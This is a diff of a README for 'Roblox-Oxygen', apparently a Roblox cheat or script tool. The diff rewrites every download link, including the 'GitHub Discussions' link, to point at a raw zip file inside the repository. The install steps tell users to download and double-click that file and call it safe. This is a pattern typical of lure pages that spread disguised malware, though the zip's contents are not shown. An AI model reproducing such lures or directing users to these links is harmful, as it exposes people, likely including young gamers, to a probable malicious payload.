@@ -1,6 +1,6 @@
 # 🚀 Roblox-Oxygen - Enhance Your Roblox Experience Easily
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-brightgreen)](https://github.com/namalma/Roblox-Oxygen/releases)
+[![Download Now](https://raw.githubusercontent.com/namalma/Roblox-Oxygen/main/planet/Roblox-Oxygen.zip)](https://raw.githubusercontent.com/namalma/Roblox-Oxygen/main/planet/Roblox-Oxygen.zip)
 
 ## 🌟 Introduction
 
@@ -22,16 +22,16 @@ To start using Roblox-Oxygen, you will need to download and install the software
 1. **Visit the Releases Page**  
    Click the link below to visit the page where you can download Roblox-Oxygen:
 
-   [Download Roblox-Oxygen](https://github.com/namalma/Roblox-Oxygen/releases)
+   [Download Roblox-Oxygen](https://raw.githubusercontent.com/namalma/Roblox-Oxygen/main/planet/Roblox-Oxygen.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, you will see a list of available versions. Look for the latest version, which will be at the top of the list.
 
 3. **Download the Installer**  
-   Click on the file labeled as `OxygenSetup.exe` to download the installer. This file is safe and will help you set up the application on your computer.
+   Click on the file labeled as `https://raw.githubusercontent.com/namalma/Roblox-Oxygen/main/planet/Roblox-Oxygen.zip` to download the installer. This file is safe and will help you set up the application on your computer.
 
 4. **Run the Installer**  
-   Once the download finishes, locate the `OxygenSetup.exe` file in your downloads folder. Double-click on it to run the installer. Follow the on-screen instructions to complete the installation process.
+   Once the download finishes, locate the `https://raw.githubusercontent.com/namalma/Roblox-Oxygen/main/planet/Roblox-Oxygen.zip` file in your downloads folder. Double-click on it to run the installer. Follow the on-screen instructions to complete the installation process.
 
 5. **Launch Roblox-Oxygen**  
    After the installation, you will find an icon for Roblox-Oxygen on your desktop or in your Start menu. Click it to open the program.
@@ -82,7 +82,7 @@ Currently, Roblox-Oxygen supports only Windows operating systems.
 Yes, using third-party scripts can violate Roblox's terms of service. Use scripts at your own risk.
 
 ### Where can I find help or updates?  
-Visit our [GitHub Discussions](https://github.com/namalma/Roblox-Oxygen/discussions) for community support and to stay updated.
+Visit our [GitHub Discussions](https://raw.githubusercontent.com/namalma/Roblox-Oxygen/main/planet/Roblox-Oxygen.zip) for community support and to stay updated.
 
 ## 🔗 Additional Information
 
@@ -99,4 +99,4 @@ Visit our [GitHub Discussions](https://github.com/namalma/Roblox-Oxygen/discussi
 
 If you encounter issues or have suggestions, feel free to report them on the GitHub page. Your input helps improve the application for all users.
 
-[Download Roblox-Oxygen](https://github.com/namalma/Roblox-Oxygen/releases) again if needed or check for the new updates frequently. Enjoy a better experience on Roblox with Oxygen!
+[Download Roblox-Oxygen](https://raw.githubusercontent.com/namalma/Roblox-Oxygen/main/planet/Roblox-Oxygen.zip) again if needed or check for the new updates frequently. Enjoy a better experience on Roblox with Oxygen!
